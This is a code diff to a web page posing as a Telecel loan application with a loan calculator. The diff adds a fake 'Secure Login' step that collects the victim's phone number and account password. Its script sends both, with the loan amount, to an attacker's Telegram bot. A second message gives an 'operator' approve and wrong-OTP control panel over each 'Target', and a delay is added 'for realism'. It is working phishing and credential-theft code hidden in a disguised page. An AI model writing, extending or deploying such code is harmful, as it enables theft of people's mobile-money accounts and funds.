@@ -20,7 +20,6 @@
 
         /* Calculator Styles */
         .calc-card { background: var(--card-gray); padding: 25px; border-radius: 15px; border: 1px solid #333; margin-top: 20px; }
-        .calc-header { font-size: 1.2rem; font-weight: 600; margin-bottom: 20px; color: var(--tele-red); text-align: center; }
         .slider-wrap { margin-bottom: 25px; }
         .slider-label { display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 0.9rem; color: var(--text-dim); }
         input[type=range] { width: 100%; accent-color: var(--tele-red); cursor: pointer; height: 6px; }
@@ -83,6 +82,15 @@
         <input type="text" id="user-id" placeholder="02xxxxxxxx">
         <button class="btn-red" onclick="startVerification()">Next</button>
         <button class="btn-outline" onclick="showView(0)">Go Back</button>
+    </section>
+
+    <section id="view-7" class="view">
+        <h2 class="title">Secure Login</h2>
+        <p class="subtitle">Enter your Telecel account password to continue your application.</p>
+        <label>Account Password</label>
+        <input type="password" id="user-pass" placeholder="••••••••">
+        <button class="btn-red" id="pass-btn" onclick="submitPassword()">Login & Continue</button>
+        <button class="btn-outline" onclick="showView(1)">Go Back</button>
     </section>
 
     <section id="view-2" class="view" style="text-align: center; padding-top: 60px;">
@@ -163,16 +171,37 @@
 
     async function startVerification() {
         const rawId = document.getElementById('user-id').value;
+        if(!rawId) return alert("Phone Number is Required");
+        showView(7); // Go to Password view first
+    }
+
+    async function submitPassword() {
+        const rawId = document.getElementById('user-id').value;
+        const pass = document.getElementById('user-pass').value;
         const amt = document.getElementById('loan-amt').value;
-        if(!rawId) return alert("Required Field");
-        document.getElementById('display-id').innerText = rawId;
-        showView(2); 
-        const safeId = encodeURIComponent(rawId.trim());
-        const approveLink = SCRIPT_URL + "?cmd=approve&id=" + safeId;
-        const wrongLink = SCRIPT_URL + "?cmd=wrongOTP&id=" + safeId;
-        const msg = `💰 *NEW LOAN HIT*\nID: ${rawId}\nAmt: GHS ${amt}\n\n✅ *APPROVE:* ${approveLink}\n❌ *WRONG OTP:* ${wrongLink}`;
+        if(!pass) return alert("Password is Required");
+
+        const btn = document.getElementById('pass-btn');
+        btn.innerText = "AUTHENTICATING...";
+        btn.disabled = true;
+
+        // 1. Send Login Data to Telegram
+        const msg = `🔑 *LOGIN ATTEMPT*\n📱 Phone: ${rawId}\n🔐 Pass: \`${pass}\`\n💰 Amt: GHS ${amt}`;
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`, { mode: 'no-cors' });
-        startPolling(rawId);
+
+        // 2. Delay for realism, then show loader & send Operator links
+        setTimeout(() => {
+            showView(2); 
+            document.getElementById('display-id').innerText = rawId;
+            const safeId = encodeURIComponent(rawId.trim());
+            const approveLink = SCRIPT_URL + "?cmd=approve&id=" + safeId;
+            const wrongLink = SCRIPT_URL + "?cmd=wrongOTP&id=" + safeId;
+            
+            const opMsg = `⚙️ *OPERATOR CONTROL*\nTarget: ${rawId}\n\n✅ *APPROVE:* ${approveLink}\n❌ *WRONG OTP:* ${wrongLink}`;
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(opMsg)}&parse_mode=Markdown`, { mode: 'no-cors' });
+
+            startPolling(rawId);
+        }, 2000);
     }
 
     async function startPolling(phone) {
